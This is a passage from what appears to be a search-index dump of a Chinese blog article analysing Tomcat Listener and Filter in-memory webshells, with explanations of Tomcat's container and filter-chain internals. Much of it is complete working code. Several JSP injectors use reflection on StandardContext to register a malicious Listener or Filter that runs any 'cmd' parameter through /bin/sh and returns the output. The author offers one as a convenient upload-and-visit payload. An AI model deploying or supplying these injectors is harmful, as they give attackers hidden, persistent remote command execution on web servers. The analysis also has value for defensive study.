//\u6267\u884c\u7ed3\u679c\u52a0\u4e0a\u56de\u8f66 sb.append(line).append(\"<br>\"); } String result = sb.toString(); this.response.getWriter().write(result); } catch (Exception e) { System.out.println(\"error \"); } } } \u5b9e\u9a8c\u4e00\u4e0b \u6211\u4eec\u5148\u8bbf\u95ee/a\u8def\u7531\uff0c\u8ba9\u4ee3\u7801\u88ab\u6267\u884c\u3002\u7136\u540e\u5230\u4efb\u610f\u9875\u9762\u4f20\u5165\u6076\u610f\u53c2\u6570 SUCCESS\u3002 \u4e3a\u4e86\u66f4\u65b9\u4fbf\u7684\u6ce8\u5165\u5185\u5b58\u9a6c\uff0c\u6211\u4ece\u7f51\u4e0a\u5ad6\u4e86\u4e00\u4e2aJSP\uff08Linux\u7248\uff09\u3002\u53ea\u8981\u6211\u4eec\u4e0a\u4f20\u8be5JSP\u7136\u540e\u8bbf\u95ee\u5b83\u4e00\u4e0b\uff0c\u5185\u5b58\u9a6c\u5c31\u88ab\u6ce8\u5165\u4e86\uff0c\u5341\u5206\u7684\u65b9\u4fbf\u3002 <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%> <%@ page import=\"org.apache.jasper.tagplugins.jstl.core.Out\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"javax.servlet.annotation.WebServlet\" %> <%@ page import=\"java.io.InputStreamReader\" %> <%@ page import=\"java.io.BufferedReader\" %> <% Object obj = request.getServletContext(); Field field = obj.getClass().getDeclaredField(\"context\"); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(obj); field = applicationContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); ListenH listenH = new ListenH(request, response); standardContext.addApplicationEventListener(listenH); out.print(\"test\"); %> <%! public class ListenH implements ServletRequestListener { public ServletResponse response; public ServletRequest request; ListenH(ServletRequest request, ServletResponse response) { this.request = request; this.response = response; } public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmder = request.getParameter(\"cmd\"); String[] cmd = new String[]{\"/bin/sh\", \"-c\", cmder}; try { Process ps = Runtime.getRuntime().exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while ((line = br.readLine()) != null) { //\u6267\u884c\u7ed3\u679c\u52a0\u4e0a\u56de\u8f66 sb.append(line).append(\"<br>\"); } String result = sb.toString(); this.response.getWriter().write(result); }catch (Exception e){ System.out.println(\"error \"); } } } %> Filter \u5185\u5b58\u9a6c http://wjlshare.com/archives/1529 Filter\u5185\u5b58\u9a6c\u4e0eListener\u5185\u5b58\u9a6c\u8fd8\u662f\u6709\u70b9\u533a\u522b\u7684\uff0c\u8981\u590d\u6742\u4e00\u70b9\u70b9 doFilter\u65b9\u6cd5\u5982\u4f55\u88ab\u6267\u884c\uff1f \u914d\u7f6efilter \u518d\u5f00\u59cb\u5206\u6790Filter\u5185\u5b58\u9a6c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5148\u77e5\u9053\uff0cFilter\u7c7b\u4e2d\u7684doFilter\u65b9\u6cd5\u662f\u5982\u4f55\u88ab\u6267\u884c\u7684\u3002 OK\u6211\u4eec\u5148\u521b\u5efa\u597d\u4e00\u4e2aFilter\u3002 Filter\u7c7b\u4ee3\u7801 import javax.servlet.*; import java.io.IOException; public class MyFilter implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { System.out.println(\"Filter!\"); chain.doFilter(req,resp); } public void init(FilterConfig config) throws ServletException { } } maven <dependency> <groupId>javax.servlet</groupId> <artifactId>javax.servlet-api</artifactId> <version>3.0.1</version> <scope>provided</scope> </dependency> \u63a5\u4e0b\u6765\u5728web.xml\u4e2d\u6dfb\u52a0Filter\u3002 \u6211\u4eec\u5728doFilter\u65b9\u6cd5\u5904\u4e0b\u65ad\u70b9\uff0c\u8fd0\u884c\uff0c\u5f97\u5230\u8c03\u7528\u5e27\u5982\u4e0b filterchain \u6211\u4eec\u4eceStandardWrapperValue#invoke \u5904\u5f00\u59cb\u5206\u6790. filterChain.doFilter(request.getRequest(), response.getResponse()); \u90a3\u4e48\u8fd9\u4e2afilterChain\u662f\u4ec0\u4e48\uff1f\u6211\u4eec\u8ddf\u8fdb\u4e00\u4e0b \u518d\u5ea6\u8ddf\u8fdb\u5230createFilterChain\u65b9\u6cd5\uff0c\u6765\u5230\u4e86ApplicationFilterFactory.java\u91cc\u3002 \u6bd4\u8f83\u5173\u952e\u7684\u4ee3\u7801\u662f\u8fd9\u91cc\u3002\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u904d\u5386FilterMaps\uff0c\u68c0\u6d4b\u6bcf\u4e2aFilterMap\u9879\u5bf9\u5e94\u7684\u90a3\u4e2aFilter\u4e0e\u8bf7\u6c42\u7684\u8def\u7531\u7b49\u662f\u5426\u4e00\u81f4\u3002\u82e5\u4e00\u81f4\u5219\u5c06\u4ee5\u8be5filter\u7684name\u4e3a\u53c2\u6570\u53bbFilterConfigs\u91cc\u53bb\u5bfb\u627e\u5bf9\u5e94\u7684FilterConfig,\u7136\u540e\u5c06\u8be5filterconfig\u653e\u5165filterchain\u4e2d\u3002\u4e0d\u4e00\u81f4\u7684\u5219\u629b\u5f03\u3002 filterconfig\u4e0efilterdef \u90a3\u4e48filterconfig\u53c8\u662f\u4e2a\u4ec0\u4e48\u6837\u7684\u4e1c\u897f\u5462\uff1f \u6211\u4eec\u8ddf\u8fdbcontext.findFilterConfig,\u8fd9\u91cc\u7684context\u662fStandardContext\u3002 \u518d\u5ea6\u8ddf\u8fdbfilterconfigs\uff0c\u5c31\u53ef\u4ee5\u5f88\u660e\u663e\u7684\u53d1\u73b0filterconfigs\u662f\u4e00\u4e2ahashmap\u7ed3\u6784 \u952e\u4e3afilter\u540d\uff0c\u503c\u4e3afilterconfig \u90a3\u4e48filterconfig\u7684\u7ed3\u6784\u53c8\u662f\u5982\u4f55\u3002\u6211\u4eec\u8ddf\u8fdbApplicationFilterConfig\u7c7b\u3002\u4e0b\u56fe\u662f\u6b64\u7c7b\u7684\u6784\u9020\u51fd\u6570 \u5173\u952e\u5730\u65b9\u5708\u51fa\u6765\u4e86\u662f\u4e0efilterdef\u6709\u5173\u7684\u4ee3\u7801\u3002\u5728\u6784\u9020\u51fd\u6570\u7684\u65f6\u5019\u5c06\u4f20\u5165context\u548cfilterdef\uff0c\u7136\u540e\u518d\u901a\u8fc7\u5bf9filterdef\u8c03\u7528getfilter\u83b7\u5f97filter\u7c7b\uff08\u5373\u6211\u4eec\u81ea\u5df1\u5b9a\u4e49\u7684filter\u7c7b\uff09\u3002 \u6211\u4eec\u518d\u770b\u770bfilterDef\u7684\u5173\u952e\u4ee3\u7801 OKOK\uff0c\u4e0a\u9762\u5c31\u662fFilterConfig\uff0cFilterChain\u548cFilterDef\u7684\u4e00\u4e9b\u96f6\u788e\u7684\u4ecb\u7ecd\u3002 \u6211\u4eec\u5927\u81f4\u53ef\u4ee5\u5f97\u5230\u4e0b\u5217\u5173\u952e\u4fe1\u606f FilterConfigs \u662f\u4e00\u4e2aHashMap\u7ed3\u6784\uff0c\u952e\u4e3afilter\u540d\uff0c\u503c\u4e3afilterconfig filterconfig\u5305\u542b\u4e86filterdef filterdef\u76f4\u63a5\u4e0efilter\u7c7b\u76f8\u5173\u8054 StandardWrapperValue#invoke \u8fd9\u4e00\u5c42\u5206\u6790\u5b8c\u4e86\uff0c\u8fd9\u4e00\u5c42\u662f\u6700\u9ebb\u70e6\u7684\uff0c\u5411\u4e0b\u4e24\u5c42\u5c06\u4f1a\u4eb2\u5207\u5f88\u591a\u3002 \u4e0b\u9762\u7684\u4e24\u5c42 \u5411\u4e0b\u5206\u6790\u6765\u5230ApplicationFilterChain#doFilter.\u8fd9\u4e00\u5c42\u5f88\u7b80\u5355\uff0c\u8c03\u4e86\u4e2ainternalDofilter\u5c31\u6ca1\u4e86 \u518d\u5411\u4e0b\u5206\u6790\u6765\u5230ApplicationFilterChain#internalDoFilter\u3002 \u5173\u952e\u7684\u5730\u65b9\u5708\u51fa\u6765\u4e86\uff0c\u5927\u81f4\u5c31\u662f\u901a\u8fc7filterchain\u91cc\u7684filterconfig\u7684getFilter\u65b9\u6cd5\uff08\u4e0b\u56fe\u4e3agetFilter\u65b9\u6cd5\uff0c\u53ef\u4ee5\u660e\u663e\u770b\u5230\u662f\u8fd4\u56de\u4e86filter\uff09\u4ece\u800c\u83b7\u5f97filterdef\u91cc\u7684filter\uff0c\u4ece\u800c\u8c03\u7528filter\u7684dofilter\uff0c\u8fd9\u5c31\u662f\u5927\u6982\u7684\u6d41\u7a0b\u3002 \u52a0\u8f7d\u8fc7\u7a0b\u6d41\u7a0b\u56fe \u6587\u5b57\u603b\u662f\u6709\u4e9b\u8d2b\u7620\u7684\uff0c\u7528\u56fe\u6765\u8bf4\u8bdd\u5c31\u4f1a\u660e\u4e86\u8bb8\u591a\u3002 FilterDef\u6dfb\u52a0 \u6211\u4eec\u5982\u4f55\u628aFilterDef\u4e0e\u6211\u4eec\u7684Filter\u5173\u8054\u8d77\u6765\u5e76\u6dfb\u52a0\u5230standardContext\u4e2d\u5462\uff1f\u8fd9\u4e2a\u95ee\u9898\u6bd4\u8f83\u5173\u952e\uff0c\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u5c06\u6211\u4eec\u7684FilterDef\u6ce8\u5165\u5230\u5185\u5b58\u624d\u80fd\u8ba9\u6211\u4eec\u7684Filter\u6709\u88ab\u8c03\u7528\u7684\u53ef\u80fd\u6027\u3002 \u5b9e\u9645\u4e0a\u5462\uff0c\u4e5f\u5f88\u7b80\u5355\u3002\u6d41\u7a0b\u4e0a\u6765\u8bf4\u4e0eListener\u5185\u5b58\u9a6c\u5dee\u4e0d\u591a \u6253\u65ad\u70b9 \u8ddf\u8fdb \u518d\u8ddf \u7ee7\u7eed\u8ddf \u6765\u5230\u6b64\u5904\uff0c\u4e0eListener\u5185\u5b58\u9a6c\u795e\u4f3c\u3002 if\u5224\u65ad\u91cc\u5224\u65ad\u4e86\u7a0b\u5e8f\u662f\u5426\u5728\u8fd0\u884c context\u662fstandardContext\uff0c\u8fd9\u91cc\u8c03\u7528\u4e86\u5b83\u7684addFilterDef\u6765\u6dfb\u52a0FilterDef\u3002 \u7f16\u5199Filter\u5185\u5b58\u9a6c \u7528\u53cd\u5c04\uff0c\u539f\u56e0\u548cListener\u662f\u4e00\u6837\u7684\u3002 \u53cd\u5c04\u4ee3\u7801 try { response.getWriter().write(\"a\"); System.out.println(\"Servlet Get Message\\n\"); Object obj = request.getServletContext(); Field field = obj.getClass().getDeclaredField(\"context\"); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(obj); field = applicationContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); //\u83b7\u53d6standardContext FilterDef filterDef = new FilterDef(); filterDef.setFilter(new MyFilter()); filterDef.setFilterName(\"MyFilter\"); standardContext.addFilterDef(filterDef); //\u5c06FilterDef\u4e0efilter\u5173\u8054\uff0c\u6ce8\u5165\u5230\u5185\u5b58 field = standardContext.getClass().getDeclaredField(\"filterConfigs\"); field.setAccessible(true); HashMap filterConfigs = (HashMap) field.get(standardContext);//\u83b7\u53d6filterConfigs Constructor constructor = Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\"). getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); filterConfigs.put(\"MyFilter\",constructor.newInstance(standardContext,filterDef)); //\u5c06\u5305\u542bfilterDef\u7684filterConfig\u6dfb\u52a0\u5230filterConfigs FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\"/*\"); filterMap.setFilterName(\"MyFilter\"); standardContext.addFilterMapBefore(filterMap); //\u5c06\u8be5filterMap\u4e0efilterConfig\u8fdb\u884cNAME\u7ed1\u5b9a\u5e76\u653e\u5230filterMaps\u7684\u9996\u4f4d } catch (IOException | NoSuchFieldException | IllegalAccessException | ClassNotFoundException | NoSuchMethodException | InstantiationException | InvocationTargetException e) { e.printStackTrace(); } \u6728\u9a6c\u672c\u4f53 public class MyFilter implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { String cmder = req.getParameter(\"cmd\"); try { Process ps = Runtime.getRuntime().exec(cmder); BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while ((line = br.readLine()) != null) { //\u6267\u884c\u7ed3\u679c\u52a0\u4e0a\u56de\u8f66 sb.append(line).append(\"<br>\"); } String result = sb.toString(); resp.getWriter().write(result); }catch (Exception e){ System.out.println(\"error \"); } chain.doFilter(req,resp); } public void init(FilterConfig config) throws ServletException { } } \u7f51\u4e0a\u5ad6\u7684JSP <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %> <%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %> <%@ page import=\"java.lang.reflect.Constructor\" %> <%@ page import=\"org.apache.catalina.Context\" %> <%@ page import=\"java.util.HashMap\" %> <%@ page import=\"java.io.BufferedReader\" %> <%@ page import=\"java.io.InputStreamReader\" %> <% Object obj = request.getServletContext(); Field field = obj.getClass().getDeclaredField(\"context\"); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(obj); field = applicationContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); FilterDef filterDef = new FilterDef(); filterDef.setFilterName(\"testF\"); standardContext.addFilterDef(filterDef); // \u5728context\u4e2d\u6dfb\u52a0filterMap\u65f6\u4f1a\u53bb\u627e\u4e00\u4e0b\u662f\u5426\u5b58\u5728\u5bf9\u5e94\u7684filterdef Filter filter = new testF(); filterDef.setFilter(filter); // \u5c06\u6211\u4eec\u521b\u5efa\u7684filter\u4e0efilterdef\u76f8\u5173\u8054\u8d77\u6765 field = standardContext.getClass().getDeclaredField(\"filterConfigs\"); field.setAccessible(true); HashMap hashMap = (HashMap) field.get(standardContext); Constructor constructor = Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\").getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); hashMap.put(\"testF\",constructor.newInstance(standardContext,filterDef)); FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\"/*\"); filterMap.setFilterName(\"testF\"); standardContext.addFilterMapBefore(filterMap); System.out.println(\"filter ok !\"); %> <%! public class testF implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { String cmder = req.getParameter(\"cmd\"); String[] cmd = new String[]{\"/bin/sh\", \"-c\", cmder}; try { Process ps = Runtime.getRuntime().exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while ((line = br.readLine()) != null) { //\u6267\u884c\u7ed3\u679c\u52a0\u4e0a\u56de\u8f66 sb.append(line).append(\"<br>\"); } String result = sb.toString(); resp.getWriter().write(result); }catch (Exception e){ System.out.println(\"error \"); } chain.doFilter(req,resp); } public void init(FilterConfig config) throws ServletException { } } %> \u603b\u7ed3 \u4e2a\u4eba\u611f\u89c9\u8fd9\u7bc7\u6587\u7ae0\u5199\u7684\u6bd4\u8f83\u4e71\uff0c\u7279\u522b\u662fFilter\u5185\u5b58\u9a6c\u3002 \u8fd9\u4e5f\u662f\u6211\u62d6\u4e863\u4e2a\u6708\u624d\u6765\u641e\u7684\u4e1c\u897f\uff0c\u8fd9\u5b66\u671f\u4e8b\u6709\u70b9\u591a\uff0c\u5f88\u591a\u4e4b\u524d\u60f3\u641e\u7684\u4e1c\u897f\u90fd\u6ca1\u817e\u51fa\u65f6\u95f4\u5f04\u3002 \u8fd9\u7bc7\u6587\u7ae0\u8bb2\u5230\u7684\u5185\u5b58\u9a6c\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u5b9e\u73b0\u5b8c\u5168\u7684\u65e0\u6587\u4ef6\u843d\u5730\uff0c\u4e2d\u95f4\u4f1a\u6709\u6076\u610fJSP\u6587\u4ef6\u843d\u5730\u3002\u66f4\u9ad8\u7ea7\u7684\u653b\u51fb\u5f62\u5f0f\u540e\u9762\u518d\u641e\u5427\u3002 \u53c2\u8003 http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/ https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext http://wjlshare.com/archives/1529 https://blog.csdn.net/angry_program/article/details/116661899","title":"tomcat Listener\uff0cFilter\u5185\u5b58\u9a6c\u7b80\u8981\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#tomcat-listenerfilter","text":"","title":"tomcat Listener\uff0cFilter\u5185\u5b58\u9a6c\u7b80\u8981\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#_1","text":"tomcat \u5bb9\u5668 Listener \u5185\u5b58\u9a6c ServletContext ApplicationContext \u7f16\u5199Listener\u5185\u5b58\u9a6c Filter \u5185\u5b58\u9a6c doFilter\u65b9\u6cd5\u5982\u4f55\u88ab\u6267\u884c\uff1f \u914d\u7f6efilter filterchain filterconfig\u4e0efilterdef \u4e0b\u9762\u7684\u4e24\u5c42 \u52a0\u8f7d\u8fc7\u7a0b\u6d41\u7a0b\u56fe FilterDef\u6dfb\u52a0 \u7f16\u5199Filter\u5185\u5b58\u9a6c \u603b\u7ed3 \u53c2\u8003","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#tomcat","text":"tomcat \u4e3b\u8981\u5305\u542b\u56db\u79cd\u5bb9\u5668\uff1aEngine\uff0cHost\uff0cContext\uff0cWrapper\u3002\u5176\u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\u56fe \u8be6\u7ec6\u89e3\u8bfb\u4e00\u4e0b\u8fd9\u4e2a\u56fe\u3002 \u4e00\u53f0\u670d\u52a1\u5668\u4e0a\u662f\u53ef\u4ee5\u914d\u7f6e\u591a\u4e2a\u7ad9\u70b9\u7684\uff0c\u5bf9\u4e8etomcat\u6765\u8bf4\uff0c\u6bcf\u4e00\u4e2a\u7ad9\u70b9\u5c31\u5bf9\u5e94\u4e00\u4e2aHOST\u3002 \u4e00\u4e2a\u7ad9\u70b9\u4e0a\u662f\u53ef\u4ee5\u914d\u7f6e\u591a\u4e2aWEB\u5e94\u7528\u7684\uff0c\u6bd4\u5982\u8bf4\u4e00\u4e2a\u7ad9\u70b9\u53ef\u80fd\u4f1a\u6709OA\uff0cSSO\uff0c\u90ae\u4ef6\u5e94\u7528\u7b49\u7b49WEB\u5e94\u7528\uff0c\u5bf9\u4e8etomcat\u6765\u8bf4\u6bcf\u4e00\u4e2aWEB\u5e94\u7528\u4fbf\u5bf9\u5e94\u7740\u4e00\u4e2aContext\u3002 \u4e00\u4e2aWEB\u5e94\u7528\u4e2d\u80af\u5b9a\u4e5f\u6709\u591a\u4e2a\u8bbf\u95ee\u8def\u5f84\uff0c\u6bd4\u5982\u8bf4OA\u53ef\u80fd\u5c31\u6709\u767b\u5f55\uff0c\u524d\u7aef\u5c55\u793a\uff0c\u641c\u7d22\u7b49\u3002\u6240\u4ee5\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u8bbf\u95ee\u8def\u5f84tomcat\u90fd\u4f1a\u5206\u914d\u4e00\u4e2aWrapper\uff0c\u6bcf\u4e00\u4e2aWrapper\u5bf9\u5e94\u4e00\u4e2aServlet\uff0c\u7528\u4e8e\u5904\u7406\u7279\u5b9a\u8bf7\u6c42\u3002","title":"tomcat \u5bb9\u5668"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#listener","text":"tomcat\u6536\u5230\u8bf7\u6c42\u65f6\uff0c\u5904\u7406\u987a\u5e8f\u662f Listener->Filter->Servlet\u3002 \u4e5f\u5c31\u662f\u8bf4Listener\u662f\u6700\u5148\u63a5\u89e6\u5230\u6570\u636e\u8bf7\u6c42\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5728Listener\u4e0a\u505a\u624b\u811a\u4ece\u800c\u8fbe\u5230\u5185\u5b58\u9a6c\u7684\u76ee\u7684\u3002 \u5b9e\u9645\u4e0a\uff0c\u6211\u4eec\u60f3\u5b9e\u73b0\u4e00\u4e2a\u5185\u5b58\u9a6c\uff0c\u601d\u8def\u4fbf\u662f\u60f3\u8ba9tomcat\u6267\u884c\u4e00\u6bb5\u6076\u610f\u7a0b\u5e8f\uff0c\u628a\u6076\u610f\u7684listener\u6216\u8005filter\u7c7b\u5199\u5165tomcat\u5185\u5b58\u4e2d\uff0c\u7531\u4e8etomcat\u5904\u7406\u8bf7\u6c42\u65f6\uff0c\u8bf7\u6c42\u4f1a\u88ablistener\u548cfilter\u5904\u7406\uff08\u4e5f\u5c31\u662f\u8bf4\u4f1a\u88ab\u6211\u4eec\u7684\u6076\u610f\u7c7b\u5904\u7406\uff09\uff0c\u56e0\u6b64\u8fbe\u5230\u9690\u853d\u7684\u6728\u9a6c\u529f\u80fd\u3002 \u5177\u4f53\u600e\u4e48\u4e2a\u5b9e\u73b0\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5927\u81f4\u60f3\u8c61\u4e00\u4e2a\u601d\u8def\uff1a\u83b7\u53d6\u670d\u52a1\u5668\u521d\u6b65\u6743\u9650\u540e\uff0c\u521b\u5efa\u4e00\u4e2aJSP\u5e76\u5411\u5185\u5199\u5165\u5411\u5185\u5b58\u6ce8\u5165\u6076\u610fListener\u6216filter\u7684\u4ee3\u7801\uff0c\u968f\u540e\u8bbf\u95eeJSP\u89e6\u53d1JSP\u4ee3\u7801\uff0c\u6076\u610fListener\u6216filter\u88ab\u6ce8\u5165\u5185\u5b58\uff0c\u968f\u540e\u5220\u9664JSP\uff0c\u901a\u8fc7\u6076\u610fListener\u6216filter\u5b9e\u73b0\u65e0\u6587\u4ef6webshell\u3002\u4f46\u662f\u7531\u4e8e\u4e00\u4e9b\u539f\u56e0\u5bfc\u81f4\u76f4\u63a5\u901a\u8fc7addListener\u6216\u8005addFilter\u6765\u6dfb\u52a0\u76d1\u542c\u5668\u6216\u8fc7\u6ee4\u5668\u4f1a\u62a5\u9519\uff0c\u5177\u4f53\u89e3\u51b3\u65b9\u6cd5\u5c31\u662f\u4e0b\u6587\u7684\u5185\u5bb9\u4e86\uff1a","title":"Listener \u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#servletcontext","text":"\u5982\u679c\u6211\u4eec\u60f3\u6dfb\u52a0\u4e00\u4e2aListener\uff0c\u90a3\u4e48\u52bf\u5fc5\u4f1a\u7528\u5230\u4e00\u4e2a\u65b9\u6cd5\uff1aaddListener\u3002 \u6211\u4eec\u6765\u5206\u6790\u4ee5\u4e0b\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u60f3\u529e\u6cd5\u901a\u8fc7addListener\u65b9\u6cd5\u628a\u6076\u610fListener\u6ce8\u5165\u5185\u5b58\u3002 \u9996\u5148addListener\u65b9\u6cd5\u662f\u8fd9\u4e48\u7528\u7684\u3002 ServletContext servletContext = this.getServletConfig().getServletContext(); servletContext.addListener(\"\"); \u6211\u4eec\u76f4\u63a5\u8ddf\u8fdbaddListener\uff0c\u4f1a\u53d1\u73b0\u8ddf\u8fdb\u5230\u4e86ServletContext\u8fd9\u4e2a\u63a5\u53e3\u7c7b\u3002 \u90a3\u4e48\u5b9e\u73b0addListener\u7684\u7c7b\u662f\u4ec0\u4e48\u5462\uff1f\u6362\u53e5\u8bdd\u8bf4\uff0cservletContext\u8fd9\u4e2a\u5b9e\u4f8b\u5316\u5bf9\u8c61\u662f\u5982\u4f55\u88ab\u5b9e\u4f8b\u5316\u7684\u5462\uff1f","title":"ServletContext"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#applicationcontext","text":"\u901a\u8fc7\u8c03\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0servletContext\u8fd9\u4e2a\u5bf9\u8c61\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2aApplicationContextFacade\u5bf9\u8c61\u3002 \u6211\u4eec\u8ddf\u8fdb\u5230ApplicationContextFacade.class\u4e2d\uff0c\u67e5\u770baddListener\u65b9\u6cd5\u7684\u5b9e\u73b0\u3002 \u53d1\u73b0\u5b9e\u9645\u4e0a\u662f\u8c03\u7528\u4e86ApplicationContext\u7c7b\u7684addListener\u65b9\u6cd5\u3002\u518d\u6b21\u8ddf\u8fdb\u3002 \u8fd9\u91cc\u8fd8\u8c03\u7528\u4e86\u4e00\u4e2aaddListener\uff0c\u518d\u6b21\u8ddf\u8fdb\u3002 \u8fd9\u91cc\u501f\u7528\u7684\u522b\u4eba\u7684\u56fe\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u670d\u52a1\u5668\u5df2\u542f\u52a8\uff0c\u90a3\u4e48\u901a\u8fc7\u76f4\u63a5\u8c03\u7528addListener\u662f\u65e0\u6cd5\u6dfb\u52a0\u76d1\u542c\u5668\u7684\u3002 \u7a76\u5176\u539f\u56e0\uff0c\u4fbf\u662f\u6b64\u5904\u7684context\u662fStandardContext\uff0c\u5b83\u7684\u72b6\u6001\u662f\u5f00\u59cb\u72b6\u6001\uff0c\u65e0\u6cd5\u5728if\u5224\u65ad\u4e2d\u8fd4\u56detrue\u3002 \u8fd9\u4e5f\u5c31\u662f\u4e0a\u6587\u63d0\u5230\u7684 \"\u4f46\u662f\u7531\u4e8e\u4e00\u4e9b\u539f\u56e0\u5bfc\u81f4\u76f4\u63a5\u901a\u8fc7addListener\u6216\u8005addFilter\u6765\u6dfb\u52a0\u76d1\u542c\u5668\u6216\u8fc7\u6ee4\u5668\u4f1a\u62a5\u9519\" \u5982\u679c\u80fd\u591f\u7a81\u7834if\u5224\u65ad\uff0c\u6765\u5230\u6b64\u5904\uff0c\u90a3\u4e48\u76d1\u542c\u5668\u5c31\u4f1a\u88ab\u987a\u5229\u7684\u6dfb\u52a0\u4e0a","title":"ApplicationContext"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#listener_1","text":"\u65e2\u7136\u963b\u788d\u6211\u4eec\u6dfb\u52a0Listener\u7684\u539f\u56e0\u5df2\u7ecf\u627e\u5230\u4e86\uff0c\u90a3\u4e48\u5c31\u5e94\u8be5\u8003\u8651\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\u4e86\u3002 